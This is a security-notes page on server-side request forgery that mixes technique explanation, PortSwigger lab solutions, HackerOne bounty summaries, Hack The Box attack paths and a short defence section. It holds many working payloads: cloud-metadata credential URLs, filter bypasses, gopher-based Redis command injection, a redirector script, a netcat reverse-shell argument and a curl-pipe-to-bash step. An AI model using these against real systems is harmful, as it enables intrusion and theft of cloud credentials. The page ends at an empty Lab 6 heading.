---
title: "SSRF"
type: technique
tags: [exploitation, h1, portswigger, server-side, ssrf, thm, web]
phase: exploitation
date_created: 2026-05-08
date_updated: 2026-07-21
sources: [ps-general-concepts, ps-labs-ssrf, thm-adv-ssrf, thm-web-ssrf, h1-scraped-ssrf, 0xdf-linux-easy-web, payloadsallthethings-ssrf, git-payloadsallthethings, git-portswigger-all-labs, assetnote-ssrf-redirect-loops]
---

# SSRF

Quick payloads: [[payloads/ssrf]].

## What it is

Server-Side Request Forgery (SSRF) is a web vulnerability that forces the server-side application to make HTTP requests to an unintended location — either back to itself (loopback), to internal back-end systems unreachable from the internet, or to arbitrary external targets. It is OWASP Top 10 #10.

## How it works

The server exposes a parameter (URL, path, hostname, or data format field) that it uses to fetch a remote resource. An attacker replaces the legitimate value with a target they control. Because the request originates from the server, it carries the server's trust level and network access — bypassing firewalls, IP allowlists, and access controls that assume only trusted machines initiate internal requests.

The server transitions through a temporary sub-state: it has accepted the attacker's URL but has not yet validated or restricted it. During this window, requests reach internal destinations that would be blocked if made directly from the attacker's machine.

## Prerequisites

- A user-controlled parameter (query string, POST body, JSON field, XML entity, HTTP header) that the server uses to construct an outbound request
- The server must actually perform the request (not just validate the URL format)
- For useful impact: internal services reachable from the server but not directly from the internet

## Methodology

### 1. Find injection points

Look for:
- Parameters containing full URLs (`stockApi=`, `url=`, `target=`, `next=`, `redirect=`)
- Partial URLs or hostnames embedded in requests
- Data formats that embed URLs (XML, JSON with URL fields)
- HTTP headers the server reads and re-requests (`Referer`, `X-Forwarded-For`, custom headers)
- Document converters (HTML/Markdown to PDF via `wkhtmltopdf` or similar) — injected `<iframe src="http://...">` tags reach internal services

**Headers that can trigger server-side requests:**

| Header | SSRF vector |
|---|---|
| `Referer` | Server fetches the referrer URL to generate previews or analytics |
| `Host` | Spoofed host override for internal routing |
| `X-Forwarded-Host` | Overrides the backend target host |
| `X-Forwarded-For` | Fakes source IP — may influence access control |
| `X-Forwarded-Proto` | Alters HTTP/HTTPS routing |
| `Forwarded` | RFC-compliant combination of forwarding headers |
| `Location` | Abused via open redirect chains |

```http
GET / HTTP/1.1
Host: internal.service
X-Forwarded-Host: 169.254.169.254
X-Forwarded-For: 127.0.0.1
```

Use **Burp extension: Collaborator Everywhere** to automatically inject Collaborator payloads into all these headers across all in-scope requests and detect blind SSRF without manual testing each header.

### 2. Basic SSRF — target the server itself

Replace the URL parameter with the loopback address to access internal admin interfaces that trust requests from localhost:

```http
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded

stockApi=http://localhost/admin
```

### 3. SSRF against internal back-end systems

Enumerate the internal network (common RFC 1918 ranges: `192.168.0.x`, `10.x.x.x`, `172.16-31.x.x`). Use Burp Intruder to sweep the last octet:

```http
stockApi=http://192.168.0.§1§:8080/admin
```

Look for responses with different length or status code — these indicate an active service.

### 4. Blind SSRF — out-of-band detection

When the response is not returned to you, use Burp Collaborator or an `interactsh` server to confirm the vulnerability:

```http
Referer: https://YOUR-COLLABORATOR-ID.oastify.com
```

A DNS lookup or HTTP hit in Collaborator confirms the server is making outbound requests. From there, sweep internal IPs blindly using the same Collaborator technique, or return malicious responses to the HTTP client to exploit client-side parsing bugs.

### 5. Cloud metadata

On AWS, GCP, and Azure instances, query the metadata endpoint:

```
# AWS
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# GCP
http://metadata.google.internal/computeMetadata/v1/
http://169.254.169.254/computeMetadata/v1/    (same IP, different path)

# Azure
http://169.254.169.254/metadata/instance?api-version=2020-09-01
```

AWS IAM credentials (AccessKeyId, SecretAccessKey, Token) enable full account compromise. Note: AWS IMDSv2 requires a `PUT` token request first — plain GET to `169.254.169.254` returns 401 on IMDSv2-enforced instances. Test both paths.

### 6. Port scanning via SSRF

Use Intruder or a custom script to iterate port numbers and identify internal services:

```python
for port_number in range(1, 65536):
    url = f"http://localhost:{port_number}"
    payload = f"url=http%3A%2F%2Flocalhost%3A{port_number}"
    # check content-length difference to detect open ports
```

### 7. Redirect-loop oracle (blind SSRF, no OOB channel)

When there is no Collaborator/interactsh callback available (egress-filtered target) and the response body is normally suppressed, an attacker-controlled redirect chain can act as an oracle. Basis: Assetnote (@shubs), "Novel SSRF Technique Involving HTTP Redirect Loops" (2025). Many apps that fetch a URL server-side handle redirect depth and non-standard status codes through different code paths; one of those paths dumps the full accumulated response buffer instead of suppressing it.

In the Assetnote case the app (libcurl-based) returned bodies only on error states, never on a `200 OK`; the desired metadata response was always `200`, so direct SSRF leaked nothing. Point the SSRF at an attacker redirector that walks the status code up on each hop (`301`, `302`, ... ), and the app's custom error handler dumped the entire redirect chain including the final internal `200`. The full chain became visible starting at status `305`.

Attacker redirector (loop N times, then jump to the internal target):

```python
@app.route("/redir")
def redir():
    n = int(request.args.get("count", 0)) + 1
    if n >= 10:
        return redirect("http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE", code=302)
    return redirect(f"/redir?count={n}", code=301 + n)   # walk 302,303,304,305...
```

Tuning knobs that form the oracle:
- **Loop depth**: below the client's max-redirects, the app parses normally (e.g. a JSON-parse exception); above it, a generic "too many redirects" error with no body. The band in between is where the buffer-dump path lives.
- **Status code**: sweep the final/intermediate redirect status (`301` to `310+`); the code that trips the verbose error handler is the leak.

Even without a body leak, "follows redirect" versus "too many redirects" is itself a no-OOB confirmation that the sink actually issues the outbound request, and the loop-vs-single differential can distinguish live internal hosts (which redirect) from dead ones.

## Key payloads / examples

### Basic localhost access

```http
stockApi=http://127.0.0.1/admin
stockApi=http://localhost/admin
```

### Internal network scan

```http
stockApi=http://192.168.0.68/admin
```

### Internal API exfiltration (THM Include CTF)

```http
http://127.0.0.1:5000/getAllAdmins101099991
```
Returns base64-encoded credentials for internal services.

### PDF/document renderer SSRF (md2pdf / Surfer CTF)

Inject into Markdown or HTML input consumed by a document converter:

```html
<iframe src="http://localhost:5000/admin"></iframe>
```

### Blind SSRF via Referer header

```http
GET /product HTTP/1.1
Host: vulnerable-site.com
Referer: https://YOUR-COLLABORATOR.oastify.com
```

## Bypasses and variants

### Blacklist bypass — alternative IP representations

Filters blocking `127.0.0.1` and `localhost` can be bypassed:

| Representation | Value |
|---|---|
| Decimal | `2130706433` |
| Octal | `017700000001` or `0177.0.0.1` |
| Hex | `0x7f000001` |
| Short form | `127.1` or `0` |
| IPv6 loopback | `::1`, `[0000::1]`, `[::ffff:127.0.0.1]` |
| DNS alias | `spoofed.burpcollaborator.net` → resolves to 127.0.0.1 |
| nip.io | `127.0.0.1.nip.io` → resolves to 127.0.0.1 |
| Domain redirects | `localtest.me` or `localh.st` |
| Enclosed Alphanumeric | `http://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ` = example.com |

Double URL encoding bypasses string-based keyword filters. For example, to access `/admin` when `admin` is blocked, double-encode each character:

```
http://127.1/%2561dmin           (double-encoded 'a' only — minimal bypass)
http://127.1/%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65   (full double-encoding of 'admin')
```

PortSwigger Lab 4 solution: `localhost` and `127.0.0.1` are both blocked; use `http://127.1/` for the host (short-form bypass), then double-encode the path to bypass the second `/admin` filter.

**Case-variation bypass**: some filters use case-sensitive string matching. Mixed-case variants bypass these:

```
http://LoCaLHosT/admin
```

### Whitelist bypass — URL parsing quirks

Exploit discrepancies between the URL validator and the HTTP client:

```
# Embed credentials before hostname (validator sees expected-host, client connects to evil-host)
https://expected-host:fakepassword@evil-host

# Fragment trick (validator sees expected-host as the host, # starts the fragment)
https://evil-host#expected-host

# Subdomain trick (DNS under attacker control)
https://expected-host.evil-host

# URL encoding (validator decodes differently than client)
https://expected-host%40evil-host

# URL parsing discrepancies (e.g. urllib2 vs requests vs urllib)
http://127.1.1.1:80\@127.2.2.2:80/
http://127.1.1.1:80:\@@127.2.2.2:80/

# PHP filter_var() Bypass (FILTER_VALIDATE_URL)
0://evil.com:80;http://google.com:80/

# DNS Rebinding (using 1u.ms)
make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms
```

**Double-encoded `#` fragment bypass (PortSwigger Lab 7):** when the validator only decodes once, a double-encoded `#` (`%2523`) survives the first decode as `%23`, so the validator still sees `localhost` as a credential (before `@`). The HTTP client then performs its own decode, interprets `%23` as `#`, and treats everything before `#` as the userinfo — causing it to connect to the whitelisted host while effectively routing the request as if `localhost` were the authority:

```
# Step 1 — validator sees "localhost%23" as username, "stock.weliketoshop.net" as host → passes whitelist
# Step 2 — HTTP client decodes %23 to #, fragment strips the rest; resulting request targets localhost
http://localhost%2523@stock.weliketoshop.net/admin/delete?username=carlos
```

This technique is parser-specific — test systematically with `%23`, `%2523`, and `%252523`.

### Bypass via open redirection

When the URL must resolve to an allowed domain but that domain has an open redirect:

```http
POST /product/stock HTTP/1.0

stockApi=http://weliketoshop.net/product/nextProduct?currentProductId=6&path=http://192.168.0.68/admin
```

The application validates the domain (`weliketoshop.net` is allowed), then follows the redirect to the internal target. Enable "Follow redirects" in Burp Repeater for this to work.

### SSRF via XXE

XML parsers that resolve external entities can be weaponised for SSRF:

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://internal-service:8080/admin" >
]>
<data><value>&xxe;</value></data>
```

See [[xxe]] for the full OOB data-exfiltration chain.

### SSRF via uploaded files

Some file formats (WAV with iXML metadata, SVG, Office XML) trigger server-side HTTP requests when processed. See CVE-2021-29447 (WordPress Media Library XXE/SSRF) for an example using a malicious WAV file.

### curl multi-URL space trick (scheme-validation bypass)

When the server validates that a URL starts with `http://` via `preg_match` but then passes the value to `curl`, supply two space-separated URLs:

```
http:// file:///etc/passwd
```

`preg_match` sees `http://` at the start and passes. `curl` processes both space-separated URLs and fetches the `file://` URI as a second target. Useful when `file://` access is the goal and `preg_match` only checks the first few characters.

### `@` authority confusion (internal vhost access)

In some URL parsers, embedding `@` reassigns the authority component, letting the request reach a different host than the validator checks:

```
# Validator sees api.host.htb as the host; curl connects to attacker server
http://api.host.htb@10.10.14.6/index.php

# Reach an internal-only vhost via path component manipulation
?uri_path=@image.internal.htb/action_handler.php
```

Useful against whitelists that check the host component: the validator parses `api.host.htb` as the hostname while the HTTP client connects to the value after `@`.

### IPv6-mapped IPv4 (blocklist bypass)

IPv4 blocklists often miss the IPv6-mapped representation of loopback:

```
http://[0:0:0:0:0:ffff:127.0.0.1]:6379/
```

This reaches `127.0.0.1:6379` while a filter checking for the literal string `127.0.0.1` does not match.

### Gopher protocol via redirect chain (GET to POST upgrade)

Most SSRF implementations issue GET requests only. To send arbitrary TCP data (e.g., Redis commands or OMI SOAP payloads), chain through an HTTP redirect to a `gopher://` URL:

```
# Attacker HTTP server redirects SSRF client to Gopher URL:
HTTP/1.1 302 Found
Location: gopher://127.0.0.1:6379/_%52%45%44%49%53%2d%43%4f%4d%4d%41%4e%44

# The SSRF client follows the redirect and sends the Gopher payload as raw TCP
```

Gopher is supported as a redirect target in libcurl and many HTTP clients. This turns a GET-only SSRF into arbitrary TCP data injection against Redis, OMI, or other services.

### Alternative URL Schemes
If `http://` or `file://` are blocked, try these alternative schemes depending on the backend client:
- **dict://**: Dictionary protocol `dict://<user>;<auth>@<host>:<port>/d:<word>:<database>:<n>`
- **sftp://**: Secure file transfer `sftp://evil.com:11111/`
- **tftp://**: Trivial file transfer `tftp://evil.com:12346/TEST`
- **ldap://**: LDAP queries `ldap://localhost:11211/%0astats%0aquit`
- **netdoc://**: Java wrapper, works when `\n` or `\r` are restricted `netdoc:///etc/passwd`
- **jar://**: Java archive (fully blind) `jar:http://127.0.0.1!/`

## Real-World Examples (HackerOne — paid reports)

The patterns below are drawn directly from disclosed, paid HackerOne reports. They show where SSRF lives in real products, which attack surfaces trigger the highest bounties, and what makes a finding critical vs. high.

---

### Document import / "import as doc" feature triggers full-read SSRF

Lark Technologies paid $5,000 (critical) for a full-read SSRF in Lark Docs' "import as docs" feature (H1 #1409727). The import flow accepted an attacker-controlled URL and fetched its content server-side; because the response was reflected back to the user, the researcher could read arbitrary internal resources — not just confirm the request was made. A second Lark report (H1 #892049, $3,000, critical) combined stored XSS with the same class of SSRF in the document-rendering pipeline, turning a medium-severity stored XSS into an internal-network pivot.

```http
POST /docs/import HTTP/1.1
Host: www.larksuite.com
Content-Type: application/json

{"import_url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
```

**Why it pays**: Full-read means the response body is returned to the attacker — instant credential/token theft rather than blind confirmation. Combined with document sharing, it becomes a stored, persistent attack vector.
**Where to look**: Any "import from URL", "embed external content", or "fetch and render remote document" feature. Look for JSON fields named `import_url`, `source_url`, `remote_url`, or `attachment_url`.

---

### PDF generator executes injected JS to reach AWS metadata

The U.S. DoD's Functional Administrative Support Tool (FAST) paid $4,000 (critical, H1 #1628209) for an SSRF where an attacker injected a JavaScript payload into a PDF form field. The server-side PDF renderer (wkhtmltopdf or equivalent) executed the script and used it to issue requests to the AWS Instance Metadata Service (IMDS), exfiltrating IAM credentials. A separate DoD asset ($1,000, H1 #1624140) exposed the same `169.254.169.254` endpoint directly through a raw `url=` parameter with no filtering.

```html
<!-- Injected into a text field processed by the PDF renderer -->
<script>
  var x = new XMLHttpRequest();
  x.open('GET', 'http://169.254.169.254/latest/meta-data/iam/security-credentials/', false);
  x.send();
  document.write(x.responseText);
</script>
```

**Why it pays**: IMDS credentials (AWS `AccessKeyId` + `SecretAccessKey` + `Token`) enable full account compromise — the SSRF becomes an IAM privilege escalation. Critical severity is almost automatic when credentials are returned.
**Where to look**: Any server-side PDF/screenshot generator that renders HTML (wkhtmltopdf, Puppeteer, PhantomJS). Inject `<iframe>`, `<script>`, or `<img src="http://169.254.169.254/...">` into user-controlled text fields.

---

### WebRTC TURN server proxies arbitrary TCP/UDP to the internal network

Slack paid $3,500 (critical, H1 #333419) for a misconfigured TURN server that accepted connection requests over TCP and UDP on behalf of any source. Because TURN relays traffic, an attacker could proxy raw TCP connections to any internal host reachable from the TURN server — effectively a protocol-agnostic SSRF that bypassed HTTP-layer filtering entirely. This allowed enumeration of the internal network, connections to `localhost`, and queries to cloud metadata services.

```bash
# TURN relay request targeting the metadata service on UDP
turnutils_uclient -u attacker -w pass -p 3478 \
  -e 169.254.169.254 -r 80 turn.slack.com
```

**Why it pays**: TURN-based SSRF is not filtered by any HTTP-level SSRF mitigation; it operates at the transport layer. Access to Docker sockets, Redis, Kubernetes API, and IMDS is all possible via the relay.
**Where to look**: Any WebRTC feature (video calls, screen sharing) exposes a TURN/STUN server. Test whether the TURN server enforces peer origin restrictions or whether it will relay to RFC 1918 addresses and `169.254.169.254`.

---

### Webhook URL parameter discloses AWS metadata (integration callbacks)

Dynatrace paid $1,500 (critical, H1 #643278) for SSRF through the "Custom Integration Webhook" feature, where the webhook URL field was fetched server-side with no SSRF protection. Setting the URL to `http://169.254.169.254/latest/meta-data/iam/security-credentials/` returned live IAM credentials. A similar TURN-to-Docker-API chain appeared in Uber's Portainer deployment ($500, H1 #366638), where SSRF reached an unauthenticated Docker API on an internal host.

```http
POST /api/v1/integrations/webhook HTTP/1.1
Host: app.dynatrace.com
Content-Type: application/json

{
  "name": "test",
  "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-default",
  "method": "GET"
}
```

**Why it pays**: Integration/webhook features are designed to make server-side HTTP calls; developers often skip SSRF controls assuming only external URLs will be used. A hit on IMDS is an automatic critical with instant cloud credential exposure.
**Where to look**: Alerting webhooks, Slack/Teams notification integrations, outbound HTTP callbacks, CI/CD pipeline triggers, monitoring agent configuration endpoints.

---

### Project import / `remote_attachment_url` field in user-generated content

GitLab paid $10,000 (high, H1 #826361) for SSRF triggered by the `remote_attachment_url` field during project import. When a project archive was imported, GitLab fetched attachment URLs server-side without adequate SSRF filtering, allowing an attacker to supply internal URLs. Because GitLab infrastructure sits on GCP/AWS, this enabled cloud metadata access and potential internal service enumeration.

```json
{
  "notes": [
    {
      "id": 1,
      "attachment": {
        "url": "http://169.254.169.254/latest/meta-data/"
      }
    }
  ]
}
```

**Why it pays**: Project import parsers are complex, trust user-supplied archives, and are rarely audited for SSRF. The $10,000 payout reflects GitLab's large self-hosted install base — the same bug hits every instance.
**Where to look**: Any "import project/data from archive or URL" feature. Inspect every URL-like field in the import format (JSON, YAML, XML). Fields named `remote_url`, `attachment_url`, `avatar_url`, `import_source` are common sinks.

---

### Chat link-preview API exposes internal services (blind SSRF in messaging platforms)

Reddit paid $6,000 (high, H1 #1960765) for a blind/partial SSRF in the `preview_link` API used by the Matrix-based chat system. The endpoint accepted a URL, fetched it server-side to generate a preview, and — while it did not return the full response body — reflected enough metadata (status codes, content-length, timing) to enumerate internal services. An attacker could distinguish live internal ports from dead ones and map the internal network.

```http
POST /_matrix/media/v3/preview_url HTTP/1.1
Host: matrix.reddit.com
Content-Type: application/json

{"url": "http://10.0.0.1:2379/v2/keys"}
```

**Why it pays**: Even partial/blind SSRF in a chat platform with millions of users reaches infrastructure shared across all users (databases, caches, internal APIs). Service enumeration is often the first step toward a higher-impact follow-on attack.
**Where to look**: URL-preview/unfurl endpoints in chat and social platforms. Look for endpoints that accept a `url` parameter and return title/description/thumbnail data. Test with `http://169.254.169.254/` and RFC 1918 addresses to check for timing or status-code differences.

---

### DNS truncation in libuv leads to SSRF via address confusion

The Internet Bug Bounty program paid $4,860 (high, H1 #2429894) for a vulnerability in the libuv library where hostnames longer than 256 characters were silently truncated before being passed to `getaddrinfo`. An attacker could craft a hostname such that the truncated result was a valid IP address (e.g., the suffix resolved to `0x7f000001` = `127.0.0.1`), causing any Node.js application that used libuv for DNS resolution to connect to localhost instead of the intended external host. Apache HTTP Server on Windows (CVE-2024-38472, $4,920) similarly mis-handled UNC paths, leaking NTLM hashes to a server under attacker control via a forced SMB SSRF.

```
# libuv truncation PoC — crafted hostname whose truncated form resolves to 127.0.0.1
AAAAAA...AAAA.0x7f000001.example.com   (>256 chars total; truncated to 0x7f000001.example.com)
```

**Why it pays**: Library-level SSRF bugs affect every application built on the vulnerable library. A single finding can earn CVE credit plus rewards from multiple affected vendors. NTLM hash leakage on Windows via UNC SSRF can enable pass-the-hash attacks.
**Where to look**: Node.js services making outbound HTTP requests with user-controlled hostnames (libuv); Apache on Windows with `mod_rewrite` rules that proxy or redirect to user-supplied URLs (UNC path injection via `//attacker/share`).

---

## Detection and defence

- **Allowlist internal service URLs**: Never trust user-supplied URLs; validate against an explicit allowlist.
- **Block cloud metadata IPs**: Firewall access to `169.254.169.254` at the network level.
- **Network segmentation**: Internal APIs should not be reachable from web-facing servers unless required.
- **Disable HTTP redirects** in server-side HTTP clients, or validate the final destination after redirects.
- **Response sanitisation**: Never return raw server-fetched content directly to the user.
- **Input validation**: Reject schemes other than `https://` and validated hostnames; block private IP ranges.
- **Logging and monitoring**: Alert on outbound requests to RFC 1918 addresses or known metadata endpoints.
- **Enforce AWS IMDSv2**: Require a session-oriented token to access instance metadata — plain `GET` to `169.254.169.254` returns 401:

```bash
# Obtain token first (IMDSv2)
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
# Use token for metadata requests
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/
```

- **Network-layer deny list (example: NGINX)**:

```nginx
location /proxy {
    deny 10.0.0.0/8;
    deny 172.16.0.0/12;
    deny 192.168.0.0/16;
    deny 127.0.0.0/8;
    deny 169.254.0.0/16;
    proxy_pass $url;
}
```

## Tools

- [[burp-suite]] — Intruder for IP/port enumeration; Repeater for manual bypass testing; Collaborator for blind SSRF OOB detection; **Collaborator Everywhere** extension for automatic header injection across all in-scope requests
- Turbo Intruder — high-concurrency requests for port sweeping
- `interactsh` (`interactsh-client`) — open-source OOB interaction server (alternative to Burp Collaborator)
- **SSRFmap** (`swisskyrepo/SSRFmap`) — automated SSRF exploitation framework; detects and exploits common SSRF sinks
- **Gopherus** (`tarunkant/Gopherus`) — SSRF payload generator for Gopher protocol targets (Redis, MySQL, FastCGI, memcached, SMTP)
- **rbndr** (`taviso/rbndr`) — DNS rebinding test tool; automates the first-IP / second-IP rebind sequence for SSRF filter bypass

## Sources

- PortSwigger Academy — SSRF (General Concepts)
- PortSwigger Labs 1–5: Basic SSRF, Internal systems, Blacklist bypass, Open-redirect bypass, Blind SSRF
- THM Advanced Web — SSRF room (`ssrfhr`)
- THM CTFs: Creative, Include, md2pdf, Surfer
- Assetnote (@shubs), "Novel SSRF Technique Involving HTTP Redirect Loops" (2025 top-10 #3) (slug: assetnote-ssrf-redirect-loops) (`https://slcyber.io/research-center/novel-ssrf-technique-involving-http-redirect-loops/`).

## From the Wild

### HTB — Browsed (2026)
- **Technique variant**: Browser Extension Exploitation, Headless Chrome
- **Attack path**: Exploit vulnerable browser extension in headless Chrome instance, escalate via debug port

### HTB — Sightless (2024)
- **Technique variant**: SQLPad SSTI + Froxlor Blind XSS
- **Attack path**: Exploit SQLPad CVE-2022-0944 template injection for container shell, crack /etc/shadow hash, Froxlor blind XSS to access KeePass DB for root

### HTB — Lantern (2024)
- **Technique variant**: Blazor .NET RCE, Pivoting, Custom Service Exploit
- **Attack path**: Exploit Blazor application vulnerability, pivot internally, exploit custom service for root

### HTB — Editorial (2024)
- **Technique variant**: SSRF + Git Credential Exposure
- **Attack path**: Exploit SSRF in cover upload to access internal API, find credentials in Git repository history, CVE-2022-24439 GitPython RCE with sudo for root

### HTB — Sau (2023)
- **Technique variant**: SSRF + Maltrail RCE
- **Attack path**: Exploit request-baskets SSRF (CVE-2023-27163) to access internal Maltrail, OS command injection (CVE-2023-27163) for shell, sudo systemctl for root

### HTB — Gofer (2023)
- **Technique variant**: Gopher SSRF, LibreOffice Macro Phishing, tcpdump Exploit
- **Attack path**: Gopher protocol SSRF via internal proxy, craft phishing doc with LibreOffice macro, tcpdump SUID for root

### HTB — Response (2022)
- **Technique variant**: Advanced SSRF, Socket.io exploitation, LDAP
- **Attack path**: SSRF to internal chat app, extract source code, escalate through LDAP

### HTB — Health (2022)
- **Technique variant**: SSRF, Gogs Exploitation, Cron Abuse
- **Attack path**: SSRF via health check webhook redirect, access internal Gogs, forge admin token, cron DB query for root

### HTB — Fulcrum (2017)
- **Technique variant**: Multi-pivot (Linux/Windows), PowerShell, XXE
- **Attack path**: Chain XXE through multiple network pivots across Linux and Windows hosts

### HTB — Minion (2017)
- **Technique variant**: ICMP exfiltration, PowerShell, IIS
- **Attack path**: Advanced PowerShell exploitation through restrictive firewall with ICMP tunneling

### HTB — Forge (2021)
- **Technique variant**: SSRF, FTP via SSRF, PDB Exploitation
- **Attack path**: SSRF bypass with uppercase URL to reach internal admin, FTP credential retrieval, Python PDB sudo for root

### HTB — Love (2021)
- **Technique variant**: SSRF + AlwaysInstallElevated
- **Attack path**: SSRF via file scanner reads internal admin page with creds, exploit Voting System upload, AlwaysInstallElevated for SYSTEM

### HTB — Travel (2020)
- **Technique variant**: Memcached Poisoning, SSRF, LDAP Admin Abuse
- **Attack path**: SSRF to poison Memcached with serialized PHP, exploit WordPress custom theme, LDAP admin for root

### HTB — Awkward (2022)
- **Technique variant**: SSRF for internal port scan and source code leak, then awk injection
- **Attack path**: `GET /api/store-status?url=` fetches any URL; wfuzz port scan via SSRF reveals port 3002 hosting API docs with full server-side source code; source exposes `awk` injection in `/api/all-leave` using the JWT username field; crack JWT secret (`123beany123`) with hashcat; forge JWT with `/' /etc/passwd '/0xdf` as username to read arbitrary files via awk pattern injection

### HTB — Backfire (2025)
- **Technique variant**: CVE-2024-41570 unauthenticated Havoc C2 SSRF chained to RCE via WebSocket tunnel
- **Attack path**: Leak `havoc.yaotl` config from port 8000; CVE-2024-41570 lets unauthenticated demons open arbitrary TCP sockets from the Havoc teamserver; tunnel to `127.0.0.1:40056` (management WebSocket, firewalled); manually craft WebSocket upgrade + auth + command frames; inject into Havoc demon builder "Service Name" field for command injection as `ilya`

### HTB — Down (2025)
- **Technique variant**: curl multi-URL space trick to bypass `preg_match` scheme validation
- **Attack path**: `url` POST param passed to `curl` via `escapeshellcmd`; `preg_match('/^https?:\/\//', $url)` filter; bypass with `http:// file:///proc/self/cwd/index.php`; PHP source reveals hidden `?expertmode=tcp` mode using `nc -vz $ip $port`; inject `443 -e /bin/bash` as the port value to get RCE

### HTB — Encoding (2023)
- **Technique variant**: `file://` LFI + `@`-authority SSRF to reach internal-only Apache vhost
- **Attack path**: API endpoint accepts `file://` URLs; read Apache config to discover `image.haxtables.htb` vhost (blocked externally, `Deny from all`); dump `.git` objects via `file://` to reconstruct repo; find bare `include($_GET['page'])` LFI in the vhost; use `@`-authority bypass in `uri_path` to reach it (`http://api.haxtables.htb@10.10.14.6/`); chain PHP filter chain generator for LFI-to-RCE

### HTB — Jarmis (2021)
- **Technique variant**: SSRF triggered by JARM fingerprint match, chained to Gopher OMIGod via redirect
- **Attack path**: JARM scanner at `/api/v1/fetch?endpoint=` makes an 11th HTTP GET only when TLS fingerprint matches a known-malicious signature; serve a Ncat-style TLS listener to trigger the 11th request; port-scan localhost via SSRF response-size differences; find port 5985 (OMI/CVE-2021-38647); chain: HTTPS endpoint → Flask redirect → `gopher://127.0.0.1:5985/_<SOAP OMIGod payload>` for unauthenticated RCE as root

### HTB — Ready (2020)
- **Technique variant**: IPv6-mapped IPv4 bypass + CRLF injection for Redis RCE in GitLab
- **Attack path**: GitLab import-by-URL (CVE-2018-19571) blocks `http://127.0.0.1:6379` but not `http://[0:0:0:0:0:ffff:127.0.0.1]:6379`; CVE-2018-19585 CRLF injection inserts Redis commands into the git URL path; queue `resque` job executing `GitlabShellWorker` with `class_eval`/`open('|curl ...|bash')` for shell inside GitLab container; escape privileged container via cgroup `release_agent`

## Payload reference (PayloadsAllTheThings)

Consolidated bypass variants from PAT for localhost filters, alternative schemes, and DNS rebinding that supplement the whitelist/blacklist bypass sections above.

### Localhost bypass — full encoding spectrum

```
# IPv6 variants
http://[::]:80/
http://[::1]:80/
http://[0000::1]:80/
http://[::ffff:127.0.0.1]/

# Decimal / octal / hex IP
http://2130706433/          # 127.0.0.1 as decimal
http://017700000001/        # 127.0.0.1 as octal
http://0x7f000001/          # 127.0.0.1 as hex
http://127.1/               # short form
http://0/                   # resolves to 0.0.0.0 (loopback on some systems)

# Domain aliases
http://127.0.0.1.nip.io/
http://localtest.me/
http://localhost.me/
```

### DNS rebinding (1u.ms service)

```
# Alternate between public IP and 169.254.169.254 on each query
make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms
```

### PHP filter_var() SSRF bypass

```
0://evil.com:80;http://google.com:80/
```

### JAR scheme (Java — fully blind, triggers request)

```
jar:http://127.0.0.1!/
jar:http://169.254.169.254!/latest/meta-data/
```

### Gopher for Redis command injection

```
# Via redirect: attacker server returns 302 to gopher URL
Location: gopher://127.0.0.1:6379/_%2a1%0d%0a%248%0d%0aflushall%0d%0a

# Direct gopher PING (when gopher:// is supported without redirect)
gopher://127.0.0.1:6379/_*2%0d%0a$4%0d%0aPING%0d%0a

# dict:// as alternative to gopher for Redis INFO
dict://127.0.0.1:6379/INFO
```

Use **Gopherus** to auto-generate Gopher payloads for Redis, MySQL, FastCGI, memcached, and SMTP targets.

## PortSwigger Labs

### Lab 1 — Basic SSRF against the local server (Apprentice)

Intercept the **Check Stock** POST request. The `stockApi` parameter is used by the server to fetch internal data. Replace its value with the loopback admin URL:

```http
POST /product/stock HTTP/1.1
Host: target-site.com
Content-Type: application/x-www-form-urlencoded

stockApi=http://localhost/admin
```

The server returns a `200 OK` with the admin panel. To delete a user, append the action endpoint:

```http
stockApi=http://localhost/admin/delete?username=carlos
```

---

### Lab 2 — Basic SSRF against another back-end system (Apprentice)

The admin panel is on an internal `192.168.0.X:8080` host. Use Burp Intruder to sweep the last octet (1–255):

```http
stockApi=http://192.168.0.§1§:8080/admin
```

Identify the IP with a `200 OK` response (e.g. `192.168.0.23`), then delete the user:

```http
stockApi=http://192.168.0.23:8080/admin/delete?username=carlos
```

---

### Lab 3 — Blind SSRF with out-of-band detection (Practitioner)

The server fetches the URL in the `Referer` header when a product page loads. The response is never returned to the user — confirm via Collaborator callback.

1. Generate a Burp Collaborator payload URL.
2. Intercept any product page request and replace the `Referer` header:

```http
Referer: http://<your-collaborator-id>.oastify.com
```

3. Forward the request. Confirm DNS/HTTP hit in Collaborator — blind SSRF confirmed.

---

### Lab 4 — SSRF with blacklist-based input filter (Practitioner)

Two filter layers: one blocks `localhost`/`127.0.0.1`, another blocks the string `admin`.

**Bypass layer 1 — short-form loopback IP:**

```
http://127.1/         → 200 OK (filter misses short form)
```

`LoCaLHosT` also bypasses case-sensitive string filters.

**Bypass layer 2 — double URL encoding the path:**

```
http://127.1/%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65
```

This double-encodes `admin`. The filter decodes once (sees `%61%64...`), the server decodes a second time (sees `admin`).

Final payload to delete the user:

```http
stockApi=http://127.1/%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65/delete?username=carlos
```

---

### Lab 5 — SSRF with filter bypass via open redirection (Practitioner)

Direct SSRF to `http://192.168.0.X:8080/admin` is blocked. The application validates the URL must begin on its own domain.

1. Find the open redirect: the **Next product** button uses `/product/nextProduct?currentProductId=1&path=...` where `path` is not validated.
2. Chain the open redirect as the `stockApi` value. URL-encode the redirect URL for reliable parsing:

```http
stockApi=/product/nextProduct%3fcurrentProductId%3d1%26path%3dhttp%3a//192.168.0.12%3a8080/admin
```

3. To delete the user, append the delete endpoint to `path`:

```http
stockApi=/product/nextProduct%3fcurrentProductId%3d1%26path%3dhttp%3a//192.168.0.12%3a8080/admin/delete?username=carlos
```

The server validates the domain (its own host) then follows the redirect to the internal target.

---

### Lab 6 — Blind SSRF with Shellshock exploitation (Expert)

